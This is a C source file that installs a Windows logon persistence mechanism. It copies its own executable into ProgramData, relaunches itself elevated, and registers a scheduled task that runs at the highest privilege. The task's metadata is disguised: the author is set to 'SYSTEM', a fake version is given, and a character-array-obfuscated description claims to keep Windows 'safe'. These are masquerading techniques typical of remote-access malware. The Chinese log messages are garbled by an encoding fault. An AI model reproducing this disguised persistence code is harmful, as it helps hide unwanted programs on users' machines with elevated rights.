/*
* Author: 962914132@qq.com
* Purpose: Create a scheduled task.
* Language: C
*/

#include "reg_startup.h"
#include <windows.h>
#include <taskschd.h>
#include <wchar.h>
#include <userenv.h>
#include <lmcons.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stddef.h>
#define Mprintf printf

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "shlwapi.lib")

inline void ConvertCharToWChar(const char* charStr, wchar_t* wcharStr, size_t wcharSize) {
	MultiByteToWideChar(CP_ACP, 0, charStr, -1, wcharStr, wcharSize);
}

int CreateScheduledTask(const char* taskName,const char* exePath,BOOL check,const char* desc,BOOL run)
{
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) {
		Mprintf("�޷���ʼ��COM�⣬������룺%ld\n", hr);
		return 1;
	}

	ITaskService* pService = NULL;
	hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, (void**)&pService);
	if (FAILED(hr)) {
		Mprintf("�޷�����TaskSchedulerʵ����������룺%ld\n", hr);
		CoUninitialize();
		return 2;
	}

	VARIANT empty;
	VariantInit(&empty);
	empty.vt = VT_EMPTY;
	hr = pService->lpVtbl->Connect(pService, empty, empty, empty, empty);
	if (FAILED(hr)) {
		Mprintf("�޷����ӵ�����ƻ����񣬴�����룺%ld\n", hr);
		pService->lpVtbl->Release(pService);
		CoUninitialize();
		return 3;
	}

	WCHAR wRootPath[MAX_PATH] = {0};
	ConvertCharToWChar("\\", wRootPath, MAX_PATH);

	ITaskFolder* pRootFolder = NULL;
	hr = pService->lpVtbl->GetFolder(pService, wRootPath, &pRootFolder);
	if (FAILED(hr)) {
		Mprintf("�޷���ȡ����ƻ�������ļ��У�������룺%ld\n", hr);
		pService->lpVtbl->Release(pService);
		CoUninitialize();
		return 4;
	}

	WCHAR wTaskName[MAX_PATH] = {0};
	ConvertCharToWChar(taskName, wTaskName, MAX_PATH);

	IRegisteredTask* pOldTask = NULL;
	hr = pRootFolder->lpVtbl->GetTask(pRootFolder, wTaskName, &pOldTask);
	if (SUCCEEDED(hr) && pOldTask != NULL) {
		Mprintf("�����Ѵ���: %s\n", taskName);
		pOldTask->lpVtbl->Release(pOldTask);
		if (check) {
			pRootFolder->lpVtbl->Release(pRootFolder);
			pService->lpVtbl->Release(pService);
			CoUninitialize();
			return 0;
		}
	}

	pRootFolder->lpVtbl->DeleteTask(pRootFolder, wTaskName, 0);

	ITaskDefinition* pTask = NULL;
	hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
	pRootFolder->lpVtbl->Release(pRootFolder);
	if (FAILED(hr)) {
		Mprintf("�޷����������壬������룺%ld\n", hr);
		pService->lpVtbl->Release(pService);
		CoUninitialize();
		return 5;
	}

	// ��������
	ITaskSettings* pSettings = NULL;
	hr = pTask->lpVtbl->get_Settings(pTask, &pSettings);
	if (SUCCEEDED(hr)) {
		BSTR zeroTime = SysAllocString(L"PT0S");
		pSettings->lpVtbl->put_ExecutionTimeLimit(pSettings, zeroTime);
		SysFreeString(zeroTime);
		pSettings->lpVtbl->put_DisallowStartIfOnBatteries(pSettings, VARIANT_FALSE);
		pSettings->lpVtbl->put_StopIfGoingOnBatteries(pSettings, VARIANT_FALSE);
		pSettings->lpVtbl->Release(pSettings);
	}

	IRegistrationInfo* pRegInfo = NULL;
	hr = pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
	if (SUCCEEDED(hr)) {
		WCHAR temp[MAX_PATH] = {0};
		ConvertCharToWChar("SYSTEM", temp, MAX_PATH);
		BSTR author = SysAllocString(temp);
		pRegInfo->lpVtbl->put_Author(pRegInfo, author);
		SysFreeString(author);
		ConvertCharToWChar("v12.0.0.1", temp, MAX_PATH);
		BSTR version = SysAllocString(temp);
		pRegInfo->lpVtbl->put_Version(pRegInfo, version);
		SysFreeString(version);
		char d[] = {'T','h','i','s',' ','s','e','r','v','i','c','e',' ','k','e','e','p','s',' ',
			'y','o','u','r',' ','w','i','n','d','o','w','s',' ','s','a','f','e','t','y','.',0};
		ConvertCharToWChar(desc ? desc : d, temp, MAX_PATH);
		BSTR bDesc = SysAllocString(temp);
		pRegInfo->lpVtbl->put_Description(pRegInfo, bDesc);
		SysFreeString(bDesc);
		pRegInfo->lpVtbl->Release(pRegInfo);
	}

	ITriggerCollection* pTriggerCollection = NULL;
	hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggerCollection);
	if (SUCCEEDED(hr)) {
		ITrigger* pTrigger = NULL;
		hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_LOGON, &pTrigger);
		pTriggerCollection->lpVtbl->Release(pTriggerCollection);
		if (FAILED(hr)) {
			Mprintf("�޷��������񴥷�����������룺%ld\n", hr);
			pTask->lpVtbl->Release(pTask);
			pService->lpVtbl->Release(pService);
			CoUninitialize();
			return 6;
		}
		pTrigger->lpVtbl->Release(pTrigger);
	}

	// ���ò���
	IActionCollection* pActionCollection = NULL;
	hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
	if (SUCCEEDED(hr)) {
		IAction* pAction = NULL;
		hr = pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
		if (SUCCEEDED(hr)) {
			IExecAction* pExecAction = NULL;
			hr = pAction->lpVtbl->QueryInterface(pAction, &IID_IExecAction, (void**)&pExecAction);
			if (SUCCEEDED(hr)) {
				WCHAR wExePath[MAX_PATH] = {0};
				ConvertCharToWChar(exePath, wExePath, MAX_PATH);
				BSTR path = SysAllocString(wExePath);
				pExecAction->lpVtbl->put_Path(pExecAction, path);
				SysFreeString(path);
				pExecAction->lpVtbl->Release(pExecAction);
			}
			pAction->lpVtbl->Release(pAction);
		}
		pActionCollection->lpVtbl->Release(pActionCollection);
	}

	// Ȩ������
	IPrincipal* pPrincipal = NULL;
	if (SUCCEEDED(pTask->lpVtbl->get_Principal(pTask, &pPrincipal))) {
		pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
		pPrincipal->lpVtbl->put_RunLevel(pPrincipal, TASK_RUNLEVEL_HIGHEST);
		pPrincipal->lpVtbl->Release(pPrincipal);
	}

	// ע������
	ITaskFolder* pFolder = NULL;
	hr = pService->lpVtbl->GetFolder(pService, wRootPath, &pFolder);
	ConvertCharToWChar(taskName, wTaskName, MAX_PATH);

	if (SUCCEEDED(hr)) {
		char userName[UNLEN + 1] = {0};
		DWORD nameLen = UNLEN + 1;
		if (GetUserNameA(userName, &nameLen)) {
			Mprintf("��������ƻ�. ��ǰ�û�����Ϊ: %s\n", userName);
		}
		WCHAR wUser[_MAX_PATH] = {0};
		ConvertCharToWChar(userName, wUser, MAX_PATH);
		BSTR bstrTaskName = SysAllocString(wTaskName);
		VARIANT vUser;
		VariantInit(&vUser);
		vUser.vt = VT_BSTR;
		vUser.bstrVal = SysAllocString(wUser);

		IRegisteredTask* pRegisteredTask = NULL;
		hr = pFolder->lpVtbl->RegisterTaskDefinition(
			pFolder,
			bstrTaskName,
			pTask,
			TASK_CREATE_OR_UPDATE,
			vUser,
			empty,
			TASK_LOGON_INTERACTIVE_TOKEN,
			empty,
			&pRegisteredTask
		);

		if (SUCCEEDED(hr)) {
			if (run) {
				IRunningTask* pRunningTask = NULL;
				hr = pRegisteredTask->lpVtbl->Run(pRegisteredTask, empty, &pRunningTask);
				if (SUCCEEDED(hr)) {
					pRunningTask->lpVtbl->Release(pRunningTask);
				}
				else {
					Mprintf("�޷��������񣬴�����룺%ld\n", hr);
				}
			}
			pRegisteredTask->lpVtbl->Release(pRegisteredTask);
		}

		VariantClear(&vUser);
		SysFreeString(bstrTaskName);
		pFolder->lpVtbl->Release(pFolder);
	}

	pTask->lpVtbl->Release(pTask);
	pService->lpVtbl->Release(pService);
	CoUninitialize();

	return SUCCEEDED(hr) ? 0 : 7;
}

BOOL IsRunningAsAdmin()
{
	BOOL isAdmin = FALSE;
	PSID administratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0, &administratorsGroup)){
		if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)){
			isAdmin = FALSE;
		}

		FreeSid(administratorsGroup);
	}

	return isAdmin;
}

BOOL LaunchAsAdmin(const char* szFilePath, const char* verb)
{
	SHELLEXECUTEINFOA shExecInfo;
	ZeroMemory(&shExecInfo, sizeof(SHELLEXECUTEINFOA));
	shExecInfo.cbSize = sizeof(SHELLEXECUTEINFOA);
	shExecInfo.fMask = SEE_MASK_DEFAULT;
	shExecInfo.hwnd = NULL;
	shExecInfo.lpVerb = verb;
	shExecInfo.lpFile = szFilePath;
	shExecInfo.nShow = SW_NORMAL;

	return ShellExecuteExA(&shExecInfo);
}

BOOL CreateDirectoryRecursively(const char* path)
{
	if (PathFileExistsA(path))
		return TRUE;

	char temp[MAX_PATH] = { 0 };
	size_t len = strlen(path);
	strncpy(temp, path, len);

	for (size_t i = 0; i < len; ++i){
		if (temp[i] == '\\'){
			temp[i] = '\0';
			if (!PathFileExistsA(temp)){
				if (!CreateDirectoryA(temp, NULL))
					return FALSE;
			}
			temp[i] = '\\';
		}
	}

	if (!CreateDirectoryA(temp, NULL))
		return FALSE;

	return TRUE;
}

int RegisterStartup(const char* startupName, const char* exeName)
{
	char folder[MAX_PATH] = { 0 };
	if (GetEnvironmentVariableA("ProgramData", folder, MAX_PATH) > 0){
		size_t len = strlen(folder);
		if (len > 0 && folder[len - 1] != '\\'){
			folder[len] = '\\';
			folder[len + 1] = '\0';
		}
		strcat(folder, startupName);

		if (!CreateDirectoryRecursively(folder)){
			Mprintf("Failed to create directory structure: %s\n", folder);
			return -1;
		}
	}

	char curFile[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, curFile, MAX_PATH);

	char dstFile[MAX_PATH] = { 0 };
	sprintf(dstFile, "%s\\%s.exe", folder, exeName);

	if (_stricmp(curFile, dstFile) != 0){
		if (!IsRunningAsAdmin()){
			if (!LaunchAsAdmin(curFile, "runas")){
				Mprintf("The program will now exit. Please restart it with administrator privileges.");
				return -1;
			}
			Mprintf("Choosing with administrator privileges: %s.\n", curFile);
			return 0;
		} else {
			Mprintf("Running with administrator privileges: %s.\n", curFile);
		}

		DeleteFileA(dstFile);
		BOOL b = CopyFileA(curFile, dstFile, FALSE);
		Mprintf("Copy '%s' -> '%s': %s [Code: %d].\n",
			curFile, dstFile, b ? "succeed" : "failed", GetLastError());

		int status = CreateScheduledTask(startupName, dstFile, FALSE, NULL, TRUE);
		Mprintf("����ƻ�����: %s!\n", status == 0 ? "�ɹ�" : "ʧ��");

		return 0;
	}
	int status = CreateScheduledTask(startupName, dstFile, TRUE, NULL, FALSE);
	Mprintf("����ƻ�����: %s!\n", status == 0 ? "�ɹ�" : "ʧ��");
	CreateFileA(curFile, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	return 1;
}
